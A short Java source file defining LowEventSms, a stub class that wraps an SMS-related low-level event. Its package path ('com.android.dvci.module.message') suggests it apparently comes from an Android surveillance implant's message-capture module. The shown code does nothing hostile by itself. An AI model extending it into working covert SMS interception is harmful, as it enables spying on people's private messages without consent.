package com.android.dvci.module.message;

import com.android.dvci.util.LowEvent;
import com.android.dvci.util.LowEventMsg;

/**
 * Created by zad on 05/06/15.
 */
public class LowEventSms  {
	private static final String TAG = "LowEventSms"; //$NON-NLS-1$
	private LowEventMsg event;
	LowEvent<byte[]> sms_event = null;
	public LowEventSms(LowEventMsg event) {
		sms_event = new LowEvent<byte[]>(event);
		this.event = event;
	}

}
